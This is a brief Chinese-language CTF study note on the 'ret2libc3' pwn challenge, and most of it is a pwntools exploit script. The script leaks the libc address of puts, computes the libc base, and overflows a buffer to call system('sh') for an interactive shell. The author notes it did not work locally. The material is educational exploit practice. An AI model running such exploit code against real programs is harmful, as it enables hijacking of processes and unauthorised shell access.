+ 这道题的 `plt` 表里面没有 `system` 函数，因此我们只能在 `libc` 里面找 `system` 。

+ 试了一下本地的环境，用本地的 `libc` 来试，没有成功。代码如下（明天试试打攻防世界那一道题）

  ```python3
  #!/bin/python3
  #coding:utf-8
  
  from pwn import *
  
  io = process("./ret2libc3")
  
  elf = ELF("./ret2libc3")
  
  libc = ELF("./libc-2.31.so")
  
  puts_got = elf.got["puts"]
  
  # puts_libc = libc.symbols["puts"]
  # system_libc = libc.symbols["system"]
  
  sh = 0x0804829E
  
  io.sendlineafter(") :", str(puts_got))
  
  io.recvuntil(b" : ")
  
  libcbase = int(io.recvuntil(b"\n", drop = True), 16) - libc.symbols["puts"]
  
  success("libcbase = 0x%x", libcbase)
  
  payload = flat([cyclic(60), libcbase + libc.symbols["system"], b'AAAA', next(elf.search(b"sh\x00"))])
  
  io.sendlineafter(b"me :", payload)
  
  io.interactive()
  ```

  